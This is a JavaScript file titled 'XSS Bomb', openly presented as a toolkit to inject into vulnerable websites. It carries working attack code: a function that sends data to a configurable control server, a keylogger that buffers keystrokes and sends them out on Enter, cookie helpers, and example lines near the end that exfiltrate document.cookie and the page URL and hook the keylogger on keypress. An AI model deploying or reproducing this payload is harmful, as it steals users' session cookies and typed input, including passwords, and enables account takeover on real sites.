/*
 *  _  _  ___  ___           ,--.!,
 * ( \/ )/ __)/ __)       __/   -*-
 *  )  ( \__ \\__ \     ,d08b.  '|`
 * (_/\_)(___/(___/     0088MM
 *                      `9MMP'
 *
 * File Name: bomb.js
 * Made by: p4p1 (Leo Smith)
 * Web Page: https://leosmith.wtf/xss
 *
 * Description:
 *  XSS Bomb is an xss file used as a toolkit for web exploits on vulnerable
 *  websites. If you wish to reuse this file, please go through
 *  the step by step guide on how to use it inside of this file.
 */

/*
 * Configuration variables
 */
const version = '0.0.2';
const color = 'background: #000; color: #bada55';
const color_ok = 'background: #000; color: #01FE23';
const color_ko = 'background: #000; color: #FE0101';
const verbose_mode = 1;

const request_type = 'GET'; // can be changed to 'POST' or others if needed
const server_control = '{CHANGEME}';
                            /* here you should provide your api server to
                               log the received input */
/*
 * global variables
 */
var input_text = "";

/*
 * Function to check the status of the server
 */
function check_server() {
  const request = new Request(server_control + '/status_check', {
    method: request_type,
    mode: 'no-cors'
  });
  fetch(request).then((response) => {
    if (verbose_mode) {console.log("%c  \tStatus: ok", color_ok);}
  }).catch((erro) => {
    if (verbose_mode) {console.log("%c  \tStatus: ko", color_ko);console.error(erro);}
  });
}

/*
 * A function to send data back to your xss_bomb instance
 */
function send_server(data) {
  var request = undefined;
  if (request_type == 'POST') {
    request = new Request(server_control, {
      method: request_type,
      mode: 'no-cors',
      body: data
    });
  } else {
    request = new Request(server_control + "?" + data, {
      method: request_type,
      mode: 'no-cors',
    });
  }
  fetch(request).then((response) => {
    if (verbose_mode) {
      console.log("%c SENDING INFO:", color);
      console.log("%c  Sent data: %s", color, data);
      console.log("%c  Status: ok", color_ok);
    }
  }).catch((erro) => {
    if (verbose_mode) {console.log("%c  \tStatus: ko", color_ko);console.error(erro);}
  });
}

/*
 * A wrapper to send keypress to a server every time Enter is pressed
 */
function send_key(event) {
  if (event.key == 'Enter' && input_text.length > 0) {
    send_server("keypress=" + input_text);
    input_text = '';
  } else {
    if (event.key != 'Enter') {
      input_text += event.key;
    }
  }
}

/*
 * A funciton to get a specific cookie
 */
function getCookie(t) {
  let e=t+"=",n=decodeURIComponent(document.cookie).split(";");
  for(let r=0;r<n.length;r++){
    let i=n[r];
    for(;" "==i.charAt(0);)
      i=i.substring(1);
    if(0==i.indexOf(e))
      return i.substring(e.length,i.length)
  }
  return ("");
}

/*
 * A funciton to set a cookie
 */
function setCookie(cname, cvalue, exdays) {
  const d = new Date();
  d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
  let expires = "expires="+d.toUTCString();
  document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}


/*
 * Main Script
 */
if (verbose_mode) {
  console.log("%c            _  _  ___  ___                  ,--.!,                 ", color);
  console.log("%c           ( \\/ )/ __)/ __)              __/   -*-                 ", color);
  console.log("%c            )  ( \\__ \\\\__ \\            ,d08b.  '|`                 ", color);
  console.log("%c           (_/\\_)(___/(___/            0088MM                      ", color);
  console.log("%c                                       `9MMP'                      ", color);
  console.log("%c  WELCOME TO XSS BOMB!!! - Version: %s - https://leosmith.wtf/xss  ", color, version);
  console.log("%c  Config:", color);
  console.log("%c  \tControl Server = %s", color, server_control);
  console.log("%c  \tRequest Types = %s", color, request_type);
  console.log("%c  Info:", color);
  console.log("%c  \tCookies = %s", color, (document.cookie.length) ? document.cookie : "(null)");
  console.log("%c  \tCurrent page = %s", color, document.location.href);
  console.log("%c  \tResolution = %dx%d", color, screen.width, screen.height);
  console.log("%c  Checking server status:", color);
  check_server();
}

/*
 * Examples
 */
// Upload data to the server
//send_server("cookies=" + document.cookie + "&current_page=" + document.location.href + "&resolution=" + screen.width + "x" + screen.height);
// Hook the keylogger on event listeners
//document.addEventListener('keypress', send_key);
